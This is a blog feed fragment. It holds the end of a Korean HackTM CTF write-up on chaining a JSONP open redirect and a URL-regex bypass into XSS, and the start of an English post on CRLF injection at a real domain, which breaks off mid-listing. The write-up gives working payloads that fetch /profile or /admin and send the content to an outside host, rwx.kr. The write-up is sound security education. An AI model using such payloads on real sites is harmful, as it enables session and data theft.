class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(checkNewMessages, <span class="number">2000</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><code>/static/app.js</code> 파일의 최하단을 확인해 보면 <code>chat_url + f</code> 을 인자로 하여 <code>$.getJSON</code> 함수를 실행하고 있습니다. <code>chat_url</code> 값을 고정으로 <code>/api/messages/</code> 이며 <code>f</code> 값은 유저명입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">getJSON</span>(<span class="string">&#x27;/api/message/&#x27;</span> + <span class="string">&#x27;../../login?next=http://rwx.kr/1.js?x=?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>따라서 <code>../../login?next=http://rwx.kr/1.js?x=?</code> 를 유저명으로 하여 관리자에게 메시지를 보내면, 관리자는 위와 같은 형태의 함수 호출을 하게 됩니다.<br> <code>url</code> 뒤에 <code>?x=?</code> 를 붙여준 이유는 jquery의 <code>getJSON</code> 함수가 이와 같은 형태의 <code>url</code> 을 인자로 받으면 <code>?</code> 부분에 <code>jQuery34108898913333225196_1580687420744</code>  와 같이 난수가 포함된 문자열로 요청을 시도하며, 받아온 결과값을 스크립트로서 실행하는 기능이 존재하기 때문입니다.</p><p>이러한 기능은 본래 <code>jsonp</code> 페이지를 지원하기 위해 존재하는 기능이지만, <code>open redirection</code> 취약점과 결합하면 공격자의 서버에서 임의의 스크립트를 받아와 실행하도록 할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/profile&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">x</span> =&gt;</span> x.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">x</span> =&gt;</span> &#123;</span><br><span class="line">    location = <span class="string">&#x27;http://rwx.kr/?d=&#x27;</span> + <span class="title function_">btoa</span>(x);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>서버에 스크립트를 저장해둔뒤, 관리자가 요청하도록 하였습니다.<br> 이후 <code>fetch</code> 함수를 통해 <code>/profile</code> 페이지를 받아와 결과 페이지를 공격자 서버로 반환하도록 합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;fullname&quot;</span>&gt;</span>Fullname<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fullname&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fullname&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;HackTM&#123;3f07fcaba6c72e3ffb640bbe9dab0edad15c84e390b8c323aa0bc3178ad7c65b&#125;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>관리자에게 메시지를 보내 스크립트를 실행 시킨 후, 서버에 전송된 데이터를 디코딩 하여 확인해 보면, 관리자의 <code>fullname</code> 부분에 플래그가 존재하는 것을 확인할 수 있습니다.</p><h2 id="497pts-Humans-of-Dancers-4th-solve"><a href="#497pts-Humans-of-Dancers-4th-solve" class="headerlink" title="[497pts] Humans of Dancers (4th solve)"></a>[497pts] <a href="#humans-of-dancers">Humans of Dancers</a> (4th solve)</h2><blockquote><p> Please do not brute-force for any files or directories.<br>Recommended browser: Chrome<br><a href="http://178.128.175.6:20900/">http://178.128.175.6:20900/</a> </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(location);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">DEFAULT_ROUTE</span> = <span class="string">&#x27;/page/acasa&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $page = $(<span class="string">&#x27;.page&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> $pageFrame = $page.<span class="title function_">find</span>(<span class="string">&#x27;.page__frame&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> currentRoute = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidUrl = <span class="keyword">function</span> (<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((url.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&#x27;//&#x27;</span>))) &#123;</span><br><span class="line">        url = <span class="string">&quot;https:&quot;</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> isValidUrl = <span class="title function_">isValidJSURL</span>(url);</span><br><span class="line">    <span class="keyword">let</span> isUrl = <span class="title function_">isValidPattern</span>(url);</span><br><span class="line">    <span class="keyword">let</span> sameDomain = url.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&#x27;/&#x27;</span>) &amp;&amp; !url.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = ((isValidUrl &amp;&amp; isUrl) || sameDomain);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> expression = <span class="regexp">/^(https?\:\/\/)?[a-zA-Z0-9_-]+(.[a-zA-Z0-9_-]+)*.[a-zA-Z]&#123;2,4&#125;(\/[a-zA-Z0-9_]+)&#123;0,15&#125;(\/[a-zA-Z0-9_]+.[a-zA-Z]&#123;2,4&#125;(\?[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)?)?(\&amp;[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)&#123;0,15&#125;$/gi</span>;</span><br><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(expression);</span><br><span class="line"><span class="keyword">var</span> isValidPattern = <span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> urlNoQueryString = url.<span class="title function_">split</span>(<span class="string">&#x27;?&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> (url != <span class="literal">null</span> &amp;&amp; !(urlNoQueryString.<span class="title function_">match</span>(regex) === <span class="literal">null</span> || (url.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>).<span class="property">length</span> - <span class="number">1</span>) &gt; <span class="number">0</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="keyword">function</span> (<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&quot;http://&quot;</span>) || url.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>))) &#123;</span><br><span class="line">        url = <span class="string">&#x27;https://&#x27;</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.<span class="property">origin</span> !== <span class="string">&#x27;null&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>/static/app.js</code> 파일을 확인해 보면 <code>hash</code> 값에 주어진 문자열을 인자로 하여 <code>isValidUrl</code> 함수를 호출하여 안전한 주소인지 확인한 후에, <code>iframe</code> 태그의 <code>src</code> 속성으로 설정합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/^(https?\:\/\/)?[a-zA-<span class="variable constant_">Z0</span>-9_-]+(.[a-zA-<span class="variable constant_">Z0</span>-9_-]+)*.[a-zA-Z]&#123;<span class="number">2</span>,<span class="number">4</span>&#125;(\/[a-zA-<span class="variable constant_">Z0</span>-9_]+)&#123;<span class="number">0</span>,<span class="number">15</span>&#125;(\/[a-zA-<span class="variable constant_">Z0</span>-9_]+.[a-zA-Z]&#123;<span class="number">2</span>,<span class="number">4</span>&#125;(\?[a-zA-<span class="variable constant_">Z0</span>-9_]+\=[a-zA-<span class="variable constant_">Z0</span>-9_]+)?)?(\&amp;[a-zA-<span class="variable constant_">Z0</span>-9_]+\=[a-zA-<span class="variable constant_">Z0</span>-9_]+)&#123;<span class="number">0</span>,<span class="number">15</span>&#125;$/gi</span><br><span class="line"><span class="comment">// matches with https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1) ...</span></span><br></pre></td></tr></table></figure><p>먼저 <code>isUrl</code> 에서 사용하는 정규식이 상당히 번잡한데, url의 <code>.</code> 문자가 escape 되지 않고 모든 문자와 매칭되도록 하고 있습니다.<br> 따라서 <code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code> 를 통해 우회할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="keyword">function</span> (<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&quot;http://&quot;</span>) || url.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>))) &#123;</span><br><span class="line">        url = <span class="string">&#x27;https://&#x27;</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.<span class="property">origin</span> !== <span class="string">&#x27;null&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>isValidJSURL</code> 함수에서는 주어진 <code>url</code> 의 <code>origin</code> 을 확인하는데 <code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code> 의 경우 <code>javascript:80</code> 을 origin 으로 인식합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// csp</span><br><span class="line">Content-Security-Policy: base-uri &#x27;self&#x27;; block-all-mixed-content; frame-ancestors &#x27;self&#x27;; object-src &#x27;none&#x27;; connect-src &#x27;self&#x27;; frame-src &#x27;self&#x27; https://www.youtube.com https://www.google.com; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https://cdnjs.cloudflare.com https://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/; report-uri /api/report-csp</span><br><span class="line">// app.js</span><br><span class="line">Object.freeze(location);</span><br></pre></td></tr></table></figure><p>위에서 필터링 함수를 우회하는데에 성공하면  <code>hash</code> 값을 조작함으로써 마음대로 스크립트를 실행할 수 있는데, csp와 <code>Object.freeze(location)</code> 을 통해 외부로 데이터 전송을 방지하고 있습니다.<br> 하지만 <code>top.location.replace(&#39;...&#39;)</code> 을 통해 <code>location</code> 이동을 하여 외부로 데이터를 보내도록 할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://178.128.175.6:20900/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&#x27;/admin&#x27;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&#x27;//rwx.kr/?&#x27;%2bbtoa(x)))</span><br></pre></td></tr></table></figure><p>위 주소는 <code>/admin</code> 페이지를 가져와 공격자의 서버로 전송하도록 합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;a href=&quot;#/page/sugestii&quot;&gt;Sugestii&lt;/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>페이지를 중간에 위와 같은 주석이 존재하는데, 접속해 보면 아래와 같은 페이지가 보입니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;path&quot;</span> <span class="attr">name</span>=<span class="string">&quot;path&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/#/page/acasa&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ijc2NTM2MGNiOTBkZTI4Y2E4ZGExMGRkMTk0NTAwNjE3MGNkNjZmYjAi.XjdpKQ.sFQg9QIAZLFkqSWYsMgfljOT5UA&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Scrie parerea ta&quot;</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://www.google.com/recaptcha/api.js&#x27;</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;g-recaptcha&quot;</span> <span class="attr">data-sitekey</span>=<span class="string">&quot;6LfE7dQUAAAAABOc1rpiWCU0CQF9Msv2XBdvgd5q&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Trimite sugestie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>hidden</code> 타입의 <code>input</code> 태그를 확인할 수 있는데, 여기에 만든 페이로드인 <code>/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&#39;/admin&#39;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&#39;//rwx.kr/?&#39;%2bbtoa(x)))</code> 를 전송해 주면 곧 관리자가 확인하고, <code>/admin</code> 페이지 내용이 수신됩니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// log</span><br><span class="line">178.128.175.6 - - [03/Feb/2020:01:33:35 +0900] &quot;GET /?PHA+CkhhY2tUTXs2NzA4ZTdhOGQxYWM4YmZhYWFlYjNmNmFhNzY2YjJjOTAzYmE3ZTgyNjQ2Y2E1YjgzYjVhMjBjOTQwYzU0ZjlhfQo8L3A+Cg== HTTP/1.1&quot; 200 67 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.130 Safari/537.36&quot;</span><br><span class="line">// decoded</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">HackTM&#123;6708e7a8d1ac8bfaaaeb3f6aa766b2c903ba7e82646ca5b83b5a20c940c54f9a&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>데이터에서 플래그를 확인할 수 있습니다.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ctftime.org/event/956&quot;&gt;https://ctftime.org/event/956&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;WreckTheLine 팀에서 주최한 CTF 입니다.&lt;/p&gt;
&lt;h2 id=&quot;1
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://blog.p6.is/category/writeup/"/>
    
    
      <category term="HackTM CTF" scheme="https://blog.p6.is/tags/HackTM-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Drive.net CRLF Injection</title>
    <link href="https://blog.p6.is/drive-net-crlf-injection/"/>
    <id>https://blog.p6.is/drive-net-crlf-injection/</id>
    <published>2020-01-31T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="desciption"><a href="#desciption" class="headerlink" title="desciption"></a>desciption</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v &#x27;http://a.d-cd.net/&#x27;</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 301 Moved Permanently</span><br><span class="line">&lt; Server: nginx</span><br><span class="line">&lt; Date: Tue, 28 Jan 2020 19:39:09 GMT</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Content-Length: 162</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Location: https://a.d-cd.net/</span><br><span class="line">&lt; X-Clacks-Overhead: GNU Terry Pratchett</span><br><span class="line">&lt; </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>I did not understand the contents of the server associated with the domain <code>a.d-cd.net</code> and did not perform analysis on the server.<br> Since <code>a.d-cd.net</code> server basically supports hsts. If you we try http request, It will be redirected to https.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v &#x27;https://a.d-cd.net/&#x27;</span><br><span class="line">*   Trying 146.255.192.80...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to a.d-cd.net (146.255.192.80) port 443 (#0)</span><br><span class="line">* ALPN, offering h2</span><br><span class="line">* ALPN, offering http/1.1</span><br><span class="line">* successfully set certificate verify locations:</span><br><span class="line">*   CAfile: /etc/ssl/certs/ca-certificates.crt</span><br><span class="line">  CApath: /etc/ssl/certs</span><br><span class="line">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span><br><span class="line">* TLSv1.3 (IN), TLS handshake, Server hello (2):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Certificate (11):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Server key exchange (12):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Server finished (14):</span><br><span class="line">* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):</span><br><span class="line">* TLSv1.2 (OUT), TLS change cipher, Client hello (1):</span><br><span class="line">* TLSv1.2 (OUT), TLS handshake, Finished (20):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Finished (20):</span><br><span class="line">* SSL connection using TLSv1.2 / ECDHE-ECDSA-AES128-GCM-SHA256</span><br><span class="line">* ALPN, server accepted to use h2</span><br><span class="line">* Server certificate:</span><br><span class="line">*  subject: C=RU; L=\U041C\U043E\U0441\U043A\U0432\U0430; O=DRIVE LLC; CN=*.d-cd.net</span><br><span class="line">*  start date: Nov 29 00:00:00 2019 GMT</span><br><span class="line">*  expire date: Feb  1 12:00:00 2022 GMT</span><br><span class="line">*  subjectAltName: host &quot;a.d-cd.net&quot; matched cert&#x27;s &quot;*.d-cd.net&quot;</span><br><span class="line">*  issuer: C=US; O=DigiCert Inc; CN=DigiCert SHA2 Secure Server CA</span><br><span class="line">*  SSL certificate verify ok.</span><br><span class="line">* Using HTTP2, server supports multi-use</span><br><span class="line">* Connection state changed (HTTP/2 confirmed)</span><br><span class="line">* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0</span><br><span class="line">* Using Stream ID: 1 (easy handle 0x55bd1505f580)</span><br><span class="line">&gt; GET / HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line">&lt; HTTP/2 404 </span><br><span class="line">&lt; server: nginx</span><br><span class="line">&lt; date: Tue, 28 Jan 2020 19:40:07 GMT</span><br><span class="line">&lt; content-type: text/html</span><br><span class="line">&lt; content-length: 146</span><br><span class="line">&lt; vary: Accept-Encoding</span><br><span class="line">&lt; x-clacks-overhead: GNU Terry Pratchett</span><br><span class="line">&lt; x-content-type-options: nosniff</span><br><span class="line">&lt; strict-transport-security: max-age=31622400</span><br><span class="line">&lt; </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">* Connection #0 to host a.d-cd.net left intact</span><br></pre></td></tr></table></figure><p>The next time I tried <code>https</code> request, you will see that the message at the top, supports <code>ALPN</code> and server offers in the order of <code>h2</code> &gt; <code>http/1.1</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v https://a.d-cd.net/path</span><br><span class="line">&gt; GET /path HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line">&lt; HTTP/2 404 </span><br><span class="line">&lt; server: nginx</span><br><span class="line">&lt; date: Tue, 28 Jan 2020 19:23:01 GMT</span><br><span class="line">&lt; content-length: 0</span><br><span class="line">&lt; x-request-id: 64624053cd48806af4bbbd43aa200100</span><br><span class="line">&lt; x-clacks-overhead: GNU Terry Pratchett</span><br><span class="line">&lt; x-content-type-options: nosniff</span><br><span class="line">&lt; strict-transport-security: max-age=31622400</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host a.d-cd.net left intact</span><br></pre></td></tr></table></figure><p>Therefore, when we request a webpage with curl or other browsers that support <code>ALPN</code> will communicate over HTTP&#x2F;2 .</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 